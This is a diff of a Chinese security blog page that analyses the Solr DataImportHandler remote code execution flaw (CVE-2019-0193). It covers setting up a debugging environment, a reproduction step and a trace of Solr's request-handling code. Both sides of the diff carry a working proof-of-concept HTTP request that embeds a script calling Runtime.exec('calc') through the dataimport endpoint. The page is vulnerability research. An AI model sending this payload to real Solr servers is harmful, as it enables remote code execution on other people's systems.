@@ -57,13 +57,13 @@
   };
 </script>
 
-  <meta name="description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip运行远程调试1234anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0$ cd server/ #一定要再ser">
+  <meta name="description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.ziphttps://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz">
 <meta name="keywords" content="Solr,漏洞分析">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析">
 <meta property="og:url" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/index.html">
 <meta property="og:site_name" content="Anemone&#39;s Blog">
-<meta property="og:description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip运行远程调试1234anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0$ cd server/ #一定要再ser">
+<meta property="og:description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.ziphttps://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png">
 <meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png">
@@ -71,10 +71,10 @@
 <meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png">
 <meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png">
 <meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png">
-<meta property="og:updated_time" content="2019-11-03T12:39:41.011Z">
+<meta property="og:updated_time" content="2019-11-23T02:36:05.576Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析">
-<meta name="twitter:description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip运行远程调试1234anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0$ cd server/ #一定要再ser">
+<meta name="twitter:description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.ziphttps://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz">
 <meta name="twitter:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png">
   <link rel="canonical" href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/">
 
@@ -294,11 +294,19 @@
                 
               
 
-              <time title="创建时间：2019-11-03 20:30:49 / 修改时间：20:39:41" itemprop="dateCreated datePublished" datetime="2019-11-03T20:30:49+08:00">2019-11-03</time>
+              <time title="创建时间：2019-11-03 20:30:49" itemprop="dateCreated datePublished" datetime="2019-11-03T20:30:49+08:00">2019-11-03</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-11-23 10:36:05" itemprop="dateModified" datetime="2019-11-23T10:36:05+08:00">2019-11-23</time>
+              </span>
             
           
             <span class="post-meta-item">
@@ -334,13 +342,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>先到solr上下载jar和src，这里选择的版本为v8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p>运行远程调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span>.0</span><br><span class="line">$ cd server/ #一定要再server下运行</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span>.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure><a id="more"></a>
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>先到solr上下载jar和src，这里选择的版本为v8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz</a></p><a id="more"></a>
 
 
-
+<p>运行远程调试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span></span><br><span class="line">$ cd server/ #一定要在server下运行</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span>/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure>
 <p>访问 <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> 出现控制台说明服务启动成功</p>
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>发送payload(注意tika是demo中存在的core，需要针对其他站点做变动)</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  	function func(x)&#123;</span><br><span class="line">  		<span class="attribute">java.lang.Runtime.getRuntime().exec("calc");</span></span><br><span class="line">  	&#125; </span><br><span class="line">  	]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  	function func(x)&#123;</span><br><span class="line">  		java.lang.Runtime.getRuntime().exec("calc");</span><br><span class="line">  	&#125; </span><br><span class="line">  	]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
 <p>能弹计算器说明payload生效。</p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>先了解下<code>/solr/{core}/dataimport</code>，该API的作用是将数据全量/增量导入到solr中，更详细解释在：</p>
 <ul>
@@ -379,7 +388,7 @@
 <p>关键代码在17-20行，首先根据request找到<code>HttpSolrCall</code>对象，再调用<code>HttpSolrCal#call()</code>方法获取返回值。</p>
 <p>那么跟到<code>org.apache.solr.servlet.HttpSolrCall#call()</code>看下…</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="找入口点"><a href="#找入口点" class="headerlink" title="找入口点"></a>找入口点</h3><p>实在看不下去了，根本不知道走哪个case，还是动态调试吧，之前已经用jwdp起了项目，现在用IDEA将src文件夹建个项目，然后加<code>dist</code>和<code>server/lib</code>目录到library里，用RemoteDebug下断点调试就行了。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="找入口点"><a href="#找入口点" class="headerlink" title="找入口点"></a>找入口点</h3><p>实在看不下去了，根本不知道走哪个case，还是动态调试吧，之前已经用jwdp起了项目，现在把solr源码下下来，用IDEA起一个项目，然后加<code>dist</code>和<code>server/lib</code>目录到library里，用RemoteDebug下断点调试就行了。</p>
 <p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p>
 <p>访问那个api后，调试发现走的是<code>PROCESS</code>的case：</p>
 <p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p>
@@ -465,6 +474,10 @@
 
             <div class="post-nav-prev post-nav-item">
               
+                <a href="/vulnresearch-Solr_Velocity_injection/" rel="prev" title="Solr Velocity模板注入漏洞分析">
+                  Solr Velocity模板注入漏洞分析 <i class="fa fa-chevron-right"></i>
+                </a>
+              
             </div>
           </div>
         
@@ -534,7 +547,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -547,7 +560,7 @@
             <a href="/categories/">
           
         
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">分类</span>
         </a>
       </div>
@@ -560,7 +573,7 @@
             <a href="/tags/">
           
         
-        <span class="site-state-item-count">67</span>
+        <span class="site-state-item-count">68</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
